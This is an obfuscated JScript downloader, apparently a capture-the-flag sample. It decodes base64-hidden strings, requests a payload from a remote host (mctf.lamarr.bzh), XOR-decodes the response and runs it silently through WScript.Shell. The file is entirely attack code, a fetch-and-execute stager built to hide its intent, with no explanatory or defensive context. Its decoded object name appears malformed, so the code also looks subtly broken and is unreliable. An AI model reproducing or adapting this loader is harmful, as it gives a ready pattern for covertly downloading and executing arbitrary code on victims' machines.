(function () {
    function concat(key) {
      var res = '';
      for (var i = 0; i < key.length; i++) {
        res += key[i];
      }
      return res;
    }
    function xor(ct, key) {
      var res = '';
      for (var i = 0; i < ct.length; i++) {
        res += String.fromCharCode(ct.charCodeAt(i) ^ key);
      }
      return res;
    }
    var _0x42f735 = atob('TVNYTDIuWE1MSFhM'); // MSXL2.XMLHXL
    var request = new ActiveXObject(_0x42f735);
    var _0xc3fb0e = ["aHR0cHM6Ly9tY3Rm", "LmxhbWFyci5iemgv", 'Q0ZjR0ZDR2du'];
    var b64url = concat(_0xc3fb0e); 
    var url = atob(b64url); // https://mctf.lamarr.bzh/CFcGFCGgn
    request.open("GET", url, false);
    request.send();
    if (request.status == 200) {
      var ct = request.responseText;
      var pt = xor(ct, 0x42);
      var args = ["W1N", "V1NjcmlwdC5TaGVsbAo="];
      var _0x66a026 = atob(args[1]); // WScript.Shell\n
      new ActiveXObject(_0x66a026).Run(pt, 0x0, true);
    } else {
      throw new Error(request.status);
    }
  })();